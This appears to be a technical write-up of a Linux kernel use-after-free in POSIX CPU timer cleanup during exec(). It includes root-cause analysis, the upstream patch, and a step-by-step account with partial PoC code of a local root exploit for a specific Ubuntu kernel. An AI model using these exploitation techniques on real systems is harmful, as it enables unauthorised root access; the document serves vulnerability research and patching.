<p align="center">
  <img src="../assets/tux.png" width="550" alt="tux">
</p>

# Intro

CVE-2026-98260 is a use-after-free vulnerability in the interaction between `exec()` in a thread other than the process leader and POSIX CPU timer cleanup. If `exec()` fails after the thread's TID has been exchanged, the RB tree node of a freed `k_itimer` remains in the timerqueue of the surviving task. When the parent reaps this task, the freed node is removed again and kernel memory is corrupted.

The public PoC turns this use-after-free into a full local privilege escalation. Starting as an unprivileged user, it exploits a vulnerable Ubuntu 26.04 `7.0.0-30-generic` system and launches a root shell.

This document explains the root cause of the vulnerability and the exploit flow of the Ubuntu PoC.

# Background

When a thread other than the leader of a multithreaded process calls `exec()`, the kernel terminates the other threads and makes the calling thread the new leader. `de_thread()` exchanges the PID associations of the calling thread and the old leader, then removes the old leader with `release_task()`. The original TGID is preserved after a successful `exec()`, but the surviving `task_struct` has changed.

The `struct k_itimer` for a POSIX CPU timer contains a `struct cpu_timer`. For a timer scoped to one thread, the `pid` field of `struct cpu_timer` references the `struct pid` of the target thread, while `node` is inserted into the `posix_cputimers` timerqueue in that thread's `struct task_struct`.

The timer object and the timerqueue are managed through separate structures. The `posix_timers` list in `struct signal_struct` tracks the `k_itimer` objects owned by the process, while `posix_cputimers` in `struct task_struct` tracks the CPU timer nodes armed on each thread. A timer must be detached from both structures before it is freed.

Even in the vulnerable state, the timer's reference keeps the `struct pid` itself alive. What disappears is the `PIDTYPE_PID` task association for that PID. As a result, `pid_task()` can return `NULL` while the timerqueue node remains linked.

# Root Cause

In the vulnerable Ubuntu source, when a thread other than the leader calls `exec()`, `de_thread()` exchanges the PID associations of the calling thread and the old leader, then immediately removes the old leader.

```c
static int de_thread(struct task_struct *tsk)
{
	[...]
	if (!thread_group_leader(tsk)) {
		struct task_struct *leader = tsk->group_leader;

		[...]
		exchange_tids(tsk, leader);                     // <=[1]
		transfer_pid(leader, tsk, PIDTYPE_TGID);
		transfer_pid(leader, tsk, PIDTYPE_PGID);
		transfer_pid(leader, tsk, PIDTYPE_SID);

		[...]
		release_task(leader);
	}
	[...]
}
```

At `[1]`, the calling thread inherits the PID of the old leader. The original `struct pid` of the calling thread, which is held by the CPU timer, moves to the old leader, and the subsequent `release_task(leader)` removes the task association for that PID. The timer still holds a PID reference, but subsequent calls to `pid_task(pid, PIDTYPE_PID)` return `NULL`.

The problem is that POSIX timer cleanup does not run immediately after `de_thread()`. It is placed after several operations that can fail.

```c
int begin_new_exec(struct linux_binprm * bprm)
{
	struct task_struct *me = current;
	int retval;

	[...]
	bprm->point_of_no_return = true;

	[...]
	retval = de_thread(me);
	if (retval)
		goto out;
	[...]
	retval = unshare_files();
	if (retval)
		goto out;

	[...]
	retval = set_mm_exe_file(bprm->mm, bprm->file);
	if (retval)
		goto out;

	[...]
	retval = exec_mmap(bprm->mm);
	if (retval)
		goto out;

	bprm->mm = NULL;

	retval = exec_task_namespaces();
	if (retval)
		goto out_unlock;

#ifdef CONFIG_POSIX_TIMERS
	spin_lock_irq(&me->sighand->siglock);
	posix_cpu_timers_exit(me);                        // <=[2]
	spin_unlock_irq(&me->sighand->siglock);
	exit_itimers(me);
	flush_itimer_signals();
#endif
	[...]
}
```

`[2]` is the normal exec path that drains the timerqueue of the calling thread. If any of `unshare_files()`, `set_mm_exe_file()`, `exec_mmap()`, or `exec_task_namespaces()` fails, however, execution never reaches this code. Because the task has already passed `point_of_no_return`, it terminates instead of returning to user space.

When `exit_itimers()` deletes POSIX timer objects on the exit path, the CPU timer deletion function looks up the task again through the stored PID.

```c
static inline struct task_struct *cpu_timer_task_rcu(struct k_itimer *timer)
{
	return pid_task(timer->it.cpu.pid, clock_pid_type(timer->it_clock));
}

[...]

static int posix_cpu_timer_del(struct k_itimer *timer)
{
	struct cpu_timer *ctmr = &timer->it.cpu;
	struct sighand_struct *sighand;
	struct task_struct *p;
	unsigned long flags;
	int ret = 0;

	rcu_read_lock();
	p = cpu_timer_task_rcu(timer);
	if (!p)
		goto out;                                      // <=[3]

	[...]
			disarm_timer(timer, p);
	[...]
out:
	rcu_read_unlock();

	if (!ret) {
		put_pid(ctmr->pid);
		timer->it_status = POSIX_TIMER_DISARMED;
	}
	return ret;
}
```

At `[3]`, if `pid_task()` returns `NULL`, `disarm_timer()` is not called. The `node` in `struct cpu_timer` therefore remains linked to the timerqueue of the calling thread, and the deletion function returns success.

The outer `exit_itimers()` does not detect this state. It detaches the ownership list, removes the timer from the hash, and drops the last reference.

```c
void posixtimer_free_timer(struct k_itimer *tmr)
{
	put_pid(tmr->it_pid);
	if (tmr->sigq.ucounts)
		dec_rlimit_put_ucounts(tmr->sigq.ucounts, UCOUNT_RLIMIT_SIGPENDING);
	kfree_rcu(tmr, rcu);
}

[...]

void exit_itimers(struct task_struct *tsk)
{
	struct hlist_head timers;
	struct hlist_node *next;
	struct k_itimer *timer;

	[...]
	hlist_for_each_entry_safe(timer, next, &timers, list) {
		scoped_guard (spinlock_irq, &timer->it_lock)
			posix_timer_delete(timer);
		posix_timer_unhash_and_free(timer);             // <=[4]
		cond_resched();
	}
	[...]
}
```

At `[4]`, `posix_timer_unhash_and_free()` reaches `posixtimer_free_timer()` through `posixtimer_putref()`. The `k_itimer` is freed with `kfree_rcu()`, but the `node` in its `struct cpu_timer` remains in the timerqueue of the surviving exec task.

The `task_struct` and its timerqueue remain alive while the task is a zombie. When the parent reaps the zombie, `release_task()` calls `__exit_signal()`, which drains the CPU timerqueue for that thread.

```c
static void cleanup_timerqueue(struct timerqueue_head *head)
{
	struct timerqueue_node *node;
	struct cpu_timer *ctmr;

	while ((node = timerqueue_getnext(head))) {
		timerqueue_del(head, node);                     // <=[5]
		ctmr = container_of(node, struct cpu_timer, node);
		ctmr->head = NULL;
	}
}

[...]

static void cleanup_timers(struct posix_cputimers *pct)
{
	cleanup_timerqueue(&pct->bases[CPUCLOCK_PROF].tqhead);
	cleanup_timerqueue(&pct->bases[CPUCLOCK_VIRT].tqhead);
	cleanup_timerqueue(&pct->bases[CPUCLOCK_SCHED].tqhead);
}

[...]

void posix_cpu_timers_exit(struct task_struct *tsk)
{
	cleanup_timers(&tsk->posix_cputimers);
}
```

At `[5]`, the kernel removes an RB tree node from an already freed `k_itimer`. This is the point where the use-after-free becomes actual memory corruption.

# Exploit

After triggering the use-after-free, the PoC transfers the stale node to the timerqueue of another CPU timer. It then reclaims the slab page that contained the `k_itimer` with a page that user space can read and write. The CPU timer handling code is made to write a `task_struct` address and an object address into this page, after which a crafted RB tree deletion replaces the `cred` pointer of the current task.

According to the BTF of the target Ubuntu kernel, `sizeof(struct k_itimer)` is `0x180`. Relative to `struct k_itimer`, the offsets of `it.cpu`, `it.cpu.elist`, and `it.cpu.handling` are `0xe0`, `0x110`, and `0x128`. The `CPUCLOCK_SCHED` timerqueue head and `cred` in `task_struct` are at `0xca0` and `0xd00`. Every offset for this target in the PoC matches this layout.

## 1. Forcing `exec()` to fail after the point of no return

The PoC maps the same memfd page into 50,000 VMAs, each covering one page. Three `CLONE_VM` helpers repeatedly call `mprotect()` across the entire range to contend on the `mmap_lock` of the old mm.

The `exec_thread()` thread, which is not the group leader, arms a `CLOCK_THREAD_CPUTIME_ID` timer for one hour of thread CPU time in the future and calls `execve()`. The killer waits until the original TID of `exec_thread()` can no longer be resolved, then sends `SIGKILL` to the new leader.

```c
static int killer(void *unused)
{
	[...]
	for (;;) {
		long ret = syscall(SYS_tgkill, tgid, tid, 0);

		if (ret < 0 && errno == ESRCH)
			break;
		sched_yield();
	}

	(void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	[...]
}

[...]

static void *exec_thread(void *unused)
{
	struct sigevent event;
	struct itimerspec dormant_timer;
	timer_t timerid;
	char *const argv[] = { (char *)"", NULL };
	char *const envp[] = { NULL };

	[...]
	dormant_timer.it_value.tv_sec = 3600;

	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &timerid))
		_exit(120);
	if (timer_settime(timerid, 0, &dormant_timer, NULL))
		_exit(121);

	atomic_store_explicit(&state.exec_tid, (int)raw_gettid(),
			      memory_order_release);
	[...]
	execve("/proc/self/exe", argv, envp);              // <=[6]
	_exit(122);
}
```

Once the exec at `[6]` passes `de_thread()`, the task association for the original TID disappears and the killer's probe receives `ESRCH`. The subsequent `SIGKILL` makes `mmap_read_lock_killable()` in `exec_mmap()` return `-EINTR`. The task therefore exits before reaching POSIX timer cleanup, creating a stale node.

## 2. Transferring the stale node and reclaiming the slab page

The parent observes the terminated task with `waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT)` but does not reap it. Even after RCU frees the `k_itimer`, the zombie's `task_struct` and stale timerqueue root remain alive.

The PoC creates and deletes 279 filler timers. The resulting 280 objects, including the victim, fill RCU sheaves that contain 28 objects each, for 10 sheaves in total. It then allocates a CPU timer in each of 392 oracle workers, one of which reuses the victim's address. The PoC then reaps the zombie with `waitpid()`.

```c
	[...]
	if (wait_zombie_without_reap(pid, &si)) {
		destroy_timer_oracle(&oracle);
		return -1;
	}

	[...]
	if (recycle_victim_into_oracle_pool()) {
		destroy_timer_oracle(&oracle);
		return -1;
	}
	nanosleep(&grace, NULL);
	if (allocate_oracle_candidates(&oracle)) {
		destroy_timer_oracle(&oracle);
		return -1;
	}
	if (waitpid(pid, &status, 0) != pid) {             // <=[7]
		destroy_timer_oracle(&oracle);
		return -1;
	}
	[...]
```

During the reap at `[7]`, the zombie's timerqueue removes the node of the candidate that reused the victim's address and sets the `head` in `struct cpu_timer` to `NULL`. The timerqueue root of the oracle worker, however, still points to the same node. When the candidate is later deleted, `head == NULL` causes the dequeue step to be skipped and only the object is freed. The stale node has now moved from the zombie's timerqueue to the oracle worker's timerqueue.

The PoC fills the partial slab with padding timers and controls the state of the RCU barn with release timers. It then deletes the candidate and padding timers to empty the slab. Next, it primes the PCP with 8,192 order 0 pages and releases a pool of drain timers, returning the victim slab page to the buddy allocator. It attempts to reclaim that page with up to 64,000 anonymous pages and the same number of AIO ring pages. The actual size of the first AIO ring is calculated from its header, and every ring page is added to the scan list, making the maximum spray approximately 128,000 pages.

## 3. Worker oracle and address disclosure

The reclaimed page contains the fake fields required at every possible `k_itimer` position. In particular, `it_lock` is left locked so that the kernel stops the worker at a controlled point while processing the object.

When an oracle worker consumes CPU time, the immediately expired node in the stale timerqueue is collected. The kernel records the current task in the `handling` field of the collected object and links `elist` into a temporary firing list on the kernel stack.

```c
static u64 collect_timerqueue(struct timerqueue_head *head,
			      struct list_head *firing, u64 now)
{
	struct timerqueue_node *next;
	int i = 0;

	while ((next = timerqueue_getnext(head))) {
		struct cpu_timer *ctmr;
		u64 expires;

		ctmr = container_of(next, struct cpu_timer, node);
		expires = cpu_timer_getexpires(ctmr);
		[...]
		if (++i == MAX_COLLECTED || now < expires)
			return expires;

		ctmr->firing = true;
		[...]
		rcu_assign_pointer(ctmr->handling, current);     // <=[8]
		cpu_timer_dequeue(ctmr);
		list_add_tail(&ctmr->elist, firing);
	}

	return U64_MAX;
}
```

At `[8]`, the kernel writes the worker's `task_struct` address to `k_itimer + 0x128` in the sprayed page. The PoC scans the pages for this pointer and identifies one unfinished worker from the same batch as the winner.

When the PoC releases the fake lock, the kernel's `list_del_init()` writes the direct map address of `elist` itself into `elist.next` and `elist.prev`. The PoC subtracts `0x110` from this value to recover the exact `k_itimer` address. These two addresses are sufficient to calculate the worker's timerqueue and `cred` field, along with the direct map addresses of fake structures placed on the same page.

## 4. Replacing cred through RB tree deletion

The PoC configures the reclaimed original timer node as `A`, the fake cred as `C`, a second fake timer node as `M`, the address of `task->cred` as `S`, and the worker's `CPUCLOCK_SCHED` timerqueue head as `H`.

```
A.parent = C
A.right  = NULL
A.left   = S
A.head   = H

C.parent = M
C.right  = A
C.left   = NULL

M.parent = NULL
M.right  = NULL
M.left   = C + 8
M.head   = H
```

The actual PoC constructs this layout inside the page using offsets verified through BTF for the target.

```c
	[...]
	const size_t object_size = 0x180;
	uint64_t node = kernel_object + 0xe0;
	uint64_t head = task + 0xca0;
	uint64_t cred_slot = task + 0xd00;
	[...]
	*(uint64_t *)(fake_cred + 0x00) = fake_timer_node_addr;
	*(uint64_t *)(fake_cred + 0x08) = node;
	*(uint64_t *)(fake_cred + 0x10) = 0;
	[...]
	*(uint64_t *)(fake_timer + 0xe0) = 0;
	*(uint64_t *)(fake_timer + 0xe8) = 0;
	*(uint64_t *)(fake_timer + 0xf0) = fake_cred_addr + 8;
	*(uint64_t *)(fake_timer + 0xf8) = 0;
	*(uint64_t *)(fake_timer + 0x100) = head;

	if (cross_page) {
		[...]
	} else {
		[...]
		*(uint64_t *)(user_object + 0xe0) = fake_cred_addr;
		*(uint64_t *)(user_object + 0xe8) = 0;
		*(uint64_t *)(user_object + 0xf0) = cred_slot; // <=[9]
		*(uint64_t *)(user_object + 0x100) = head;
		[...]
	}
	[...]
```

`[9]` sets `A.left = S`. The three adjacent lines set `A.parent = C`, `A.right = NULL`, and `A.head = H`. If the object crosses a page boundary, the same layout is split across the two sides of the boundary.

In the Linux RB tree deletion code, a node with no right child and only a left child enters the following branch.

```c
static __always_inline struct rb_node *
__rb_erase_augmented(struct rb_node *node, struct rb_root *root,
		     const struct rb_augment_callbacks *augment)
{
	struct rb_node *child = node->rb_right;
	struct rb_node *tmp = node->rb_left;
	struct rb_node *parent, *rebalance;
	unsigned long pc;

	[...]
	} else if (!child) {
		[...]
		tmp->__rb_parent_color = pc = node->__rb_parent_color; // <=[10]
		parent = __rb_parent(pc);
		__rb_change_child(node, tmp, parent, root);
		rebalance = NULL;
		tmp = parent;
	} else {
		[...]
	}
	[...]
}
```

In the first `rb_erase_cached(A, H)`, `tmp` at `[10]` is `S` and `pc` is `C`. This single line therefore writes `task->cred = C`. Following the crafted parent links also changes the cached leftmost node to `M`.

The same iteration of `collect_timerqueue()` immediately processes `M`. In the second deletion, `tmp` is `C + 8` and `pc` is 0, so `[10]` sets both the `uid` and `gid` fields of the fake cred to 0. The PoC prepares the remaining IDs, capabilities, `user_namespace`, and the AppArmor security and label fields around the fake cred in advance.

The core result of deleting the two crafted RB nodes in succession is that the address of the fake cred is written to `task->cred`, and the first two ID fields in that cred are set to 0.

## 5. Launching a root shell through a setuid helper

Only the corrupted worker's `cred` changes, while `real_cred` remains unchanged. Before its cred is corrupted, the worker calls `warm_splice_pipe()` to allocate the `current->splice_pipe` that `sendfile()` will use. The PoC does not create a new process from this worker and instead escalates privileges using file system calls only. It copies the previously opened `/proc/self/exe` into a new file, makes that file owned by root through the fake cred with `fsuid == 0`, and sets the setuid bit.

```c
	[...]
	out = (int)syscall(SYS_openat, AT_FDCWD, path,
			   O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0700);
	if (out < 0)
		return 0;
	if (syscall(SYS_newfstatat, out, "", &st, AT_EMPTY_PATH) || st.st_uid) {
		[...]
		return 0;
	}

	[...]
	if (!copied || syscall(SYS_fchmod, out, 04755)) { // <=[11]
		[...]
		return 0;
	}
	[...]
	(void)syscall(SYS_write, g_launch_wfd, path, strlen(path) + 1);
	[...]
```

At `[11]`, the PoC changes the mode of the file, which it previously confirmed is owned by uid 0, to `04755`. It selects a writable temporary path on a mount that does not use `nosuid`.

The launcher was forked before the memory corruption and therefore retains valid credentials. When the launcher calls `execve()` on the path sent by the worker through a pipe, setuid processing gives the new image an effective uid of 0. The new image calls `setresgid(0, 0, 0)` and `setresuid(0, 0, 0)`, then launches `/bin/bash -i`. The corrupted worker and the exploit process remain parked without attempting to clean up the fake structures.

## 6. Porting to a Container Escape

Some people market container escapes as something special, but they are not. A container changes `nsproxy` to new namespaces and changes `fs->root` to the container rootfs, so an exploit can be ported using a technique such as overwriting `core_pattern`. I will not bother including the ported exploit.

# Patch

This vulnerability was fixed by upstream commit `acb03d388181`. The patch groups POSIX timer cleanup into `posixtimer_exec()` and moves it immediately after a successful `de_thread()`.

The essential upstream change is shown below.

```diff
diff --git a/fs/exec.c b/fs/exec.c
--- a/fs/exec.c
+++ b/fs/exec.c
@@ -1115,6 +1115,17 @@ static struct file *bprm_identity_file(const struct linux_binprm *bprm)
 	return bprm->file;
 }
 
+static void posixtimer_exec(struct task_struct *me)
+{
+#ifdef CONFIG_POSIX_TIMERS
+	spin_lock_irq(&me->sighand->siglock);
+	posix_cpu_timers_exit(me);
+	spin_unlock_irq(&me->sighand->siglock);
+	exit_itimers(me);
+	flush_itimer_signals();
+#endif
+}
+
 /*
  * Calling this is the point of no return. None of the failures will be
  * seen by userspace since either the process is already taking a fatal
@@ -1152,6 +1163,16 @@ int begin_new_exec(struct linux_binprm * bprm)
 	retval = de_thread(me);
 	if (retval)
 		goto out;
[...]
+	posixtimer_exec(me);
+
 	/* see the comment in check_unsafe_exec() */
 	current->fs->in_exec = 0;
 	/*
@@ -1206,14 +1227,6 @@ int begin_new_exec(struct linux_binprm * bprm)
 	if (retval)
 		goto out_unlock;
 
-#ifdef CONFIG_POSIX_TIMERS
-	spin_lock_irq(&me->sighand->siglock);
-	posix_cpu_timers_exit(me);
-	spin_unlock_irq(&me->sighand->siglock);
-	exit_itimers(me);
-	flush_itimer_signals();
-#endif
-
 	/*
 	 * Make the signal table private.
 	 */
```

Now, immediately after `de_thread()` succeeds, `posix_cpu_timers_exit()` removes every CPU timer node from the timerqueue of the calling thread. `exit_itimers()` then deletes the `k_itimer` objects, so a freed node cannot remain in the timerqueue even if a later stage of `exec()` fails.
